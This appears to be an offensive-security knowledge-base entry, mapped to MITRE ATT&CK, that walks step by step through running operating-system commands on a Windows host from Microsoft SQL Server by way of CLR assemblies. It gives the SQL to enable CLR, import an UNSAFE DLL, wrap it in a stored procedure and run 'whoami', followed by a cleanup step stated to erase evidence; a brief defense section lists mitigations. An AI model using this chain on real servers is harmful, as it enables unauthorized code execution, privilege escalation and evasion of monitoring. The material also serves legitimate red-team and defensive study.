---
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:20.439838+00:00'
updated_at: '2023-04-10T20:36:42.117302+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - '[[techniques/Process Injection|T1055 - Process Injection]]'
  - >-
    [[techniques/System Owner User Discovery|T1033 - System Owner/User
    Discovery]]
sub_techniques: []
tags:
  - '[[tags/CLR Assemblies]]'
  - '[[tags/MSSQL Server]]'
  - '[[tags/Code Execution]]'
commands:
  - '[[commands/sql-enable-advanced-options]]'
  - '[[commands/sql-enable-clr]]'
  - '[[commands/sql-create-assembly-from-dll]]'
  - '[[commands/sql-create-procedure-cmd-exec]]'
  - '[[commands/sql-execute-cmd-exec-whoami]]'
  - '[[commands/sql-drop-procedure-and-assembly]]'
platforms:
  - Windows
  - SQL Server
tools: []
validated: true
---

# Creating-and-Importing-CLR-Assembly-for-OS-Command-Execution-in-MSSQL

## Summary

This procedure enables CLR integration in Microsoft SQL Server, creates and imports a custom CLR assembly (DLL) that allows execution of operating system commands, links it to a stored procedure, executes a command to retrieve current user information, and cleans up traces. It is useful for attackers with database access to achieve remote code execution on the underlying Windows host, bypassing some security controls.

## Description

CLR (Common Language Runtime) assemblies allow .NET code to run within SQL Server, enabling advanced functionality like OS command execution if configured with UNSAFE permissions. An attacker with sufficient privileges (typically sysadmin) can enable CLR, import a malicious DLL containing code to spawn processes, create a stored procedure wrapper, and invoke it to run commands like 'whoami'. This technique injects code into the SQL Server process (sqlservr.exe), potentially leading to privilege escalation or data exfiltration. The target environment is a Windows server running MSSQL with CLR disabled by default for security. Prerequisites include file system access to place the DLL or alternative methods like binary embedding (not covered here due to incompleteness). Success allows arbitrary command execution under the SQL Server service account context, often high-privilege.

## Requirements

1. Sysadmin-level access to the MSSQL instance.
2. Ability to write files to the server filesystem (e.g., c:\temp) or alternative import method.
3. A pre-compiled CLR DLL (e.g., cmd_exec.dll) developed in C# or VB.NET with a class exposing a method to execute OS commands via System.Diagnostics.Process.
4. SQL Server Management Studio (SSMS) or sqlcmd for execution.
5. .NET Framework installed on the server (typically present).

## Defense

- Disable CLR integration if not required: Use sp_configure 'clr enabled', 0; RECONFIGURE.
- Restrict assembly creation to trusted users and monitor DDL events for CREATE ASSEMBLY.
- Run SQL Server under least-privilege accounts and enable auditing for stored procedure creation/execution.
- Use AppLocker or similar to block untrusted DLL loading into sqlservr.exe.
- Monitor process creation from sqlservr.exe using EDR tools like Sysmon (Event ID 1 with Image=sqlservr.exe, CommandLine containing cmd.exe).

## Objectives

1. Enable CLR to allow assembly loading.
2. Import a malicious CLR assembly into the database.
3. Create a stored procedure to invoke the assembly's command execution method.
4. Execute an OS command to demonstrate control (e.g., identify current user).
5. Clean up artifacts to evade detection.

## Instructions

### Step 1: Enable Advanced Configuration Options

**Context**: SQL Server hides advanced options by default; enabling them exposes CLR settings for configuration.

**Command** ([[commands/sql-enable-advanced-options]]):
```sql
sp_configure 'show advanced options', 1;
RECONFIGURE;
GO
```

> This updates the server configuration to show advanced options. Expected output includes confirmation like "Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install."

### Step 2: Enable CLR Integration

**Context**: CLR must be explicitly enabled to load and execute .NET assemblies; this step applies the setting globally.

**Command** ([[commands/sql-enable-clr]]):
```sql
sp_configure 'clr enabled', 1;
RECONFIGURE;
GO
```

> This activates CLR hosting in SQL Server. Expected output: "Configuration option 'clr enabled' changed from 0 to 1. Run the RECONFIGURE statement to install." Restart may be required in some cases, but RECONFIGURE often suffices.

### Step 3: Create and Place the CLR DLL

**Context**: The CLR DLL must implement a class (e.g., StoredProcedures) with a static method (e.g., cmd_exec) that uses System.Diagnostics.Process to run OS commands and return output. Compile this in Visual Studio targeting .NET Framework compatible with the server. Place the resulting cmd_exec.dll on the server at c:\temp\cmd_exec.dll (requires file write access).

No specific command here; perform externally. Verify placement with file existence check if possible.

**Expected Output**: DLL file present at specified path.

### Step 4: Import the CLR Assembly

**Context**: Load the DLL as an assembly into the database with UNSAFE permissions to allow external resource access and unmanaged code execution.

**Command** ([[commands/sql-create-assembly-from-dll]]):
```sql
CREATE ASSEMBLY my_assembly
FROM 'c:\temp\cmd_exec.dll'
WITH PERMISSION_SET = UNSAFE;
GO
```

> This registers the assembly. Expected output: "The module 'cmd_exec.dll' was successfully loaded." If path issues, ensure UNC or local path accessibility.

### Step 5: Create Stored Procedure Wrapper

**Context**: Link the assembly to a database stored procedure, allowing SQL invocation of the .NET method for command execution.

**Command** ([[commands/sql-create-procedure-cmd-exec]]):
```sql
CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR(4000)
AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];
GO
```

> This creates the procedure. Expected output: "The module 'cmd_exec' depends on the assembly 'my_assembly'." The parameter @execCommand passes the OS command to execute.

### Step 6: Execute OS Command

**Context**: Invoke the stored procedure to run 'whoami' and capture the current user context (typically the SQL Server service account).

**Command** ([[commands/sql-execute-cmd-exec-whoami]]):
```sql
EXEC cmd_exec 'whoami';
GO
```

> This executes the command via the CLR. Expected output: The result set showing the user, e.g., "nt service\mssqlserver" or similar, depending on service account.

### Step 7: Clean Up Artifacts

**Context**: Remove the procedure and assembly to erase evidence of the activity.

**Command** ([[commands/sql-drop-procedure-and-assembly]]):
```sql
DROP PROCEDURE cmd_exec;
DROP ASSEMBLY my_assembly;
GO
```

> This deletes the objects. Expected output: "The module 'cmd_exec' was dropped." and "Assembly 'my_assembly' was dropped."

## Expected Output

Successful execution yields OS command output via the stored procedure, confirming code execution capability. Cleanup ensures no persistent artifacts remain in the database.
